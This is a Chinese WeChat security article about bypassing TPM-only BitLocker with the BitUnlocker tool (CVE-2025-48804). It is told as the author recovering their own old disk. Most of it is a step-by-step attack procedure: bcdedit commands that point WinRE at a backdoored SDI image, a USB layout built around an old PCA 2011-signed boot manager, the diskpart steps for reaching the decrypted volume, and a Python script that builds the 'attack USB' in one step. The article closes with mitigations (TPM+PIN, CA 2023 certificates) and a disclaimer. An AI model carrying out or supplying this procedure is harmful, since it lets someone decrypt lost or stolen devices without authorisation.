---
title: 我亲手用 BitUnlocker 解锁了尘封2年的硬盘，全程只花了5分钟
url: https://mp.weixin.qq.com/s/NncN_n56vn98igu6A9UFig
source: Doonsec's feed
date: 2026-05-17
fetch_date: 2026-05-18T06:09:38.307875
---

# 我亲手用 BitUnlocker 解锁了尘封2年的硬盘，全程只花了5分钟

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ZaibroIiatwe0rCvMj73ibI38SI5P9ppj8icDuoeIyKfkBW2MaTfvP0Zw1uj4bDiaxulmlTnLeQDrR3kNXtmIibAAWJcUlkFztljn3CJ9PmAiadHIE/0?wx_fmt=jpeg)

# 我亲手用 BitUnlocker 解锁了尘封2年的硬盘，全程只花了5分钟

原创

利刃信安
利刃信安

利刃信安

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 我亲手用 BitUnlocker 解锁了尘封2年的硬盘，全程只花了5分钟

**摘要：** 一块全盘 BitLocker 加密、补丁打满的硬盘，真的安全吗？在经历硬盘“数字死亡”的2年后，我用一套开源工具，不加密码、不拆芯片，仅靠一个 U 盘和几行 Python 脚本，就让所有数据重见天日。这篇文章全程记录了我的操作、漏洞的核心原理，以及一套可以“一键生成攻击U盘”的自研脚本——不是为了教人破解，而是为了告诉你：你习以为常的安全防线，可能只差一个旧签名。

---

两年前，我把一块存满项目源码、个人文档和照片的硬盘用 BitLocker 加密封存。当时的想法很简单：Windows 自带、TPM 加持、补丁全打，就算丢了也只是硬件损失。

两年后，当我翻出这块硬盘时，恢复密钥早已不知所踪。它安静地躺在抽屉里，却像一个永远无法开启的“数字保险箱”。

![](https://mmbiz.qpic.cn/mmbiz_png/ZaibroIiatwe05uCeSXibIHQibQAQ1G2rOiaZMXwlic3icCcUJiaHT5SMqfccBGXLJ8yhRbSOdXHd9NSgfkTCXkMt3oaWowGKzWhkDeomA0tXrkQOFw/640?wx_fmt=png&from=appmsg)

直到一个名为 **BitUnlocker** 的工具进入我的视野。安全研究员 **garatc** 将整套攻击方案公布在了 GitHub，它利用编号 **CVE-2025-48804** 的漏洞，号称可以在 **5分钟内**，让一台全量打补丁、BitLocker 正常运行的设备，把所有数据摊在攻击者面前。

我决定亲自验证。下面是我从原理到脚本、从手动到自动的完整记录。

## 补丁打了，但“脸”还在：漏洞到底在哪？

在动手之前，我逼自己把原理啃透了。结论是：**这个漏洞打的不是加密算法，而是微软自己给旧证书的“过度信任”。**

问题主要出在 Windows 恢复环境（WinRE）的 **SDI 文件加载机制** 上。SDI 是一种用于存放启动镜像的容器格式，在启动恢复流程时，Windows 启动管理器会校验 SDI 内部 **第一个** WIM 镜像的签名合法性，但对于存储在内置 blob 表中的 **第二个** 镜像，校验机制却缺失了。攻击者只需将一个篡改过的 WinRE 镜像（启动后直接弹出 `cmd.exe`）替换到 SDI 文件的 blob 区，系统在挂载 BitLocker 卷之后，就会无感知地启动这个被植入的后门环境。

此时 TPM 芯片的 PCR 测量值（PCR 7 和 PCR 11）完全正常，卷主密钥（VMK）被静默释放，**整个解密过程没有暴力破解，也没有凭据窃取**。

更深层的问题在于 **Secure Boot 的验证逻辑**：它验证的是签名的来源是否可信（即证书链是否被信任），而非二进制文件的版本是否最新。这意味着那些已被修补功能漏洞、但仍使用微软旧根证书 **PCA 2011** 签名的旧版 `bootmgfw.efi`，在未显式吊销该证书的设备上，签名依然被判定为合法。补丁打了，可旧身份的“门禁卡”并没被回收，这个新旧版本间的信任时间差，正是整套降级攻击能够成立的根本原因。

## 手动操作：我如何一步步拿到数据

理论成立，接下来是实操。整个 PoC 流程分两大步：**在攻击机上制作恶意 U 盘**，以及**在目标机 WinRE 中篡改引导配置**。

### 1. 进入目标机的 WinRE 命令提示符

在目标电脑开机或重启时，按住 `Shift` 键点击 **电源 → 重启**，系统会进入高级启动选项菜单。依次选择 **疑难解答 → 高级选项 → 命令提示符**。

过程中系统可能会弹出“需要输入 BitLocker 恢复密钥才能继续”的对话框——**不要慌，直接点“跳过此驱动器”** 即可进入命令提示符。如果提示“无法在锁定的设备上运行 cmd”，也只需点击 **“重新启动”** 重试一次即可。若始终无法进入，可以自己准备一个 WinPE 启动盘代替。

插入一个空白 U 盘，记下它被分配的盘符，这里假设为 `E:`。

### 2. 导出并篡改 BCD 启动配置

在命令提示符中，切换到 U 盘后依次执行以下命令，目的是导出现有启动配置，然后让 Windows 恢复环境在启动时加载我们放在 U 盘里的恶意 SDI 镜像：

```
E:
bcdedit /export BCD_modded
bcdedit /store BCD_modded /set {default} path \WINDOWS\system32\winload_DOESNOTEXIST.efi
bcdedit /store BCD_modded /enum all
```

其中 `winload_DOESNOTEXIST.efi` 是一个故意填错的路径，作用只是避免默认条目被意外触发。

执行 `enum all` 后，在输出信息中找到 **“Windows Recovery”** 对应的那个条目，记录下它后面那串 `{GUID}`（形如 `{1a2b3c4d-...}`）。然后继续：

```
bcdedit /store BCD_modded /set {GUID} ramdisksdidevice boot
bcdedit /store BCD_modded /set {GUID} ramdisksdipath \sdi\boot_patched.sdi
move BCD_modded BCD
```

### 3. 组装 U 盘文件结构

现在，把以下三个文件按照严格结构放入一个格式化好的 FAT32 U 盘中（建议用另一台电脑操作）：

```
U盘根目录/
├── EFI/
│   ├── Boot/
│   │   └── bootx64.efi              # PCA 2011 签名的旧版启动管理器
│   └── Microsoft/
│       └── Boot/
│           └── BCD                   # 刚刚修改好的 BCD 文件
└── sdi/
    └── boot_patched.sdi              # 注入后门的 SDI 镜像
```

* • `bootx64.efi`：可从任意未打 2025 年 7 月补丁的 Windows 11 镜像中提取，也可以用 BitUnlocker 项目提供的版本。
* • `boot_patched.sdi`：约 300 MB，可直接从项目的 GitHub Releases 页面下载，也可用项目中的 `patch_sdi.py` 脚本自己生成。
* • `BCD`：即上一步在 WinRE 中修改后保存的文件，务必放入对应位置。

> 为什么一定要在 WinRE 里改 BCD？因为正常启动的系统下，BitLocker 卷处于加密状态，你根本访问不到系统分区里的引导配置。这个步骤目前仍需要手动在目标机完成。

### 4. 启动，见证奇迹

把 U 盘插入目标电脑，开机后通过启动菜单（通常是 `F12`、`F9` 或 `Esc`）选择从 U 盘 UEFI 启动。如果 U 盘选项不显示，可以在高级启动菜单中使用 **“从文件启动”**，手动导航到 `EFI\Boot\bootx64.efi`。

进度条走完，屏幕上弹出一个命令行窗口。输入 `diskpart`，然后 `list volume`，两年前那块加密硬盘的分区已经解密并分配好盘符，安静地等着我。若盘符没自动出现，只需：

```
select volume X
assign letter=C
exit
```

文件完好无损，像时间从未流逝过。

如果目标机器没有 USB 接口可用，BitUnlocker 还支持 **PXE 网络启动**，用 `dnsmasq` 搭建 TFTP 服务器，通过网线传输 SDI 文件，效果完全相同，只是 SDI 较大，传输需要几分钟。

## 自动化：我把制作过程写成了 Python 一键脚本

手动创建目录、复制文件、反复检查路径实在乏味，而且易出错。于是一不做二不休，我写了一个 Python 脚本，**把制作恶意 U 盘的过程压缩成一条命令**。你只需把三个必备文件放在脚本旁边，剩下的格式化、建目录、复制全由脚本自动完成。

```
#!/usr/bin/env python3
"""
BitUnlocker USB 一键制作工具 (仅供授权测试)
使用前请准备三个文件并与脚本放在同一目录：
  1. bootmgfw.efi     — PCA 2011 签名的旧版启动管理器
  2. boot_patched.sdi — 替换后的恶意 SDI 镜像
  3. BCD               — 在目标机 WinRE 中修改后的启动配置（可选，但强烈建议提前准备）
"""

import os
import sys
import shutil
import subprocess
import platform

# ---------- 配置区 ----------
USB_DRIVE = "D:"          # 请修改为你的 U 盘实际盘符
BOOTMGFW_SRC = "bootmgfw.efi"
SDI_SRC = "boot_patched.sdi"
BCD_SRC = "BCD"           # 如果还没有，可留空，脚本会跳过并给出提示
# ---------------------------

def run_cmd(cmd: str) -> str:
    """执行命令并回显输出，出错则退出"""
    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if proc.returncode != 0:
        print(f"[!] 命令执行失败：{cmd}\n{proc.stderr.strip()}")
        sys.exit(1)
    return proc.stdout.strip()

def check_admin():
    """确认脚本以管理员权限运行（Windows）"""
    try:
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("[!] 请以管理员身份运行本脚本，否则无法格式化 U 盘。")
            sys.exit(1)
    except Exception:
        pass  # 非 Windows 系统忽略

def format_usb(drive: str):
    """将目标驱动器格式化为 FAT32"""
    print(f"[*] 正在格式化 {drive} 为 FAT32（所有数据将被清除）...")
    run_cmd(f"format {drive} /FS:FAT32 /Q /Y")

def create_structure_and_copy():
    """创建目录结构并复制关键文件"""
    root = USB_DRIVE + "\\"
    dirs = ["EFI\\Boot", "EFI\\Microsoft\\Boot", "sdi"]
    for d in dirs:
        os.makedirs(root + d, exist_ok=True)

    print("[*] 复制 bootx64.efi ...")
    shutil.copy(BOOTMGFW_SRC, root + "EFI\\Boot\\bootx64.efi")
    shutil.copy(BOOTMGFW_SRC, root + "EFI\\Microsoft\\Boot\\bootmgfw.efi")

    print("[*] 复制 boot_patched.sdi ...")
    shutil.copy(SDI_SRC, root + "sdi\\boot_patched.sdi")

    if os.path.exists(BCD_SRC):
        print("[*] 复制 BCD ...")
        shutil.copy(BCD_SRC, root + "EFI\\Microsoft\\Boot\\BCD")
    else:
        print("[!] 未找到 BCD 文件。请先在目标机 WinRE 中按步骤生成 BCD，再放回本目录重新运行脚本。")

def main():
    if platform.system() != "Windows":
        print("[!] 本脚本目前仅支持在 Windows 下制作 U 盘。")
        sys.exit(1)

    check_admin()

    for f in [BOOTMGFW_SRC, SDI_SRC]:
        if not os.path.isfile(f):
            print(f"[!] 缺失必要文件：{f}")
            sys.exit(1)

    # 检查目标盘符是否存在
    if not os.path.exists(USB_DRIVE + "\\"):
        print(f"[!] 目标盘符 {USB_DRIVE} 不存在，请检查 U 盘是否正确插入并修改脚本配置。")
        sys.exit(1)

    confirm = input(f"[!] 即将格式化 {USB_DRIVE} 并写入 BitUnlocker 文件，确认继续？(yes/no): ")
    if confirm.strip().lower() != "yes":
        print("[-] 操作已取消。")
        sys.exit(0)

    format_usb(USB_DRIVE)
    create_structure_and_copy()
    print("[+] USB 准备完成！插入目标机器，从 U 盘 UEFI 启动即可。")

if __name__ == "__main__":
    main()
```

### 使用方式

1. 1. 确保 `bootmgfw.efi`、`boot_patched.sdi` 两个文件与脚本在同一目录。
2. 2. **若要连同 BCD 一起部署**，提前在目标机 WinRE 中按上文命令生成 `BCD` 文件，也放到该目录。
3. 3. 将脚本开头的 `USB_DRIVE` 变量改为你 U 盘的实际盘符（如 `E:`）。
4. 4. 在 PowerShell 或 cmd 中以 **管理员身份** 运行：

   ```
   python bitunlocker_usb.py
   ```
5. 5. 确认警告后，脚本自动完成格式化、建目录、复制，一条龙完成 U 盘制作。

## 谁不受影响？防线还在，只是需要你加固

BitUnlocker 的成功依赖于两个前提：设备仍然信任 PCA 2011 证书，且 BitLocker 仅使用 TPM 纯硬件保护模式。以下场景可以有效阻断攻击：

* • **配置了 TPM + PIN 码**：预启动时需要用户输入 PIN，TPM 才会释放 VMK，攻击因缺失 PIN 而终止。
* • **已迁移至 Windows UEFI CA 2023 证书**：2026 年初之后全新安装的 Windows 11 默认使用 CA 2023 证书签名的 `bootmgfw.efi`，旧版 PCA 2011 签名的文件将被安全启动拒绝，降级攻击从根源上失效。你可以用以下命令自查：

  ```
  mountvol S: /s
  sigcheck -i S:\EFI\Microsoft\Boot\bootmgfw.efi
  ```

  **注意**：一定要检查 EFI 分区内的那份 `bootmgfw.efi`，而不是 `C:\Windows\Boot\EFI` 下的副本，因为后者未必与启动实际使用的文件一致。

## 一块硬盘教会我的事

这次经历像一面镜子。BitLocker 曾是我心中 Windows 平台上最坚固的数据防线，但一个对旧证书的“过度信任”，就让这道墙悄然裂开了一条缝。

安全从来不是单点的绝对坚固，而是整条信任链的环环相扣。任何一个环节对“过时但合法”的身份过于宽容，都可能成为决堤之口。对我而言，教训很具体：**花几分钟设一个 TPM + PIN**，远比安心躺在“全盘加密”四个字上更实在。

我解锁了硬盘，也解锁了对“安全默认值”的迷信。

> **免责声明**：本文所述工具、方法及脚本，**仅供拥有完全权限的设备所有者和获得明确书面授权的安全从业人员进行教育与研究使用**。任何未经授权的访问、复制或解密他人数据的行为均属违法，行为人应自行承担全部法律责任。

---

**参考来源**

* • GitHub 项目：https://github.com/garatc/BitUnlocker
* • 微软安全博客：BitUnlocker: Leveraging Windows Recovery to Extract BitLocker Secrets
* • 微信公众号：CVE-2025-48804｜BitUnlocker 把 BitLocker 的脸打了

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ZaibroIiatwe1Ijz7jib5Bwjy65Kzg7q6JU6BGvgr2NLDZOvGs639QJHWib6ibMWNN4nGGlAgbfBtiaRWccAfh4KGpoibDzDw...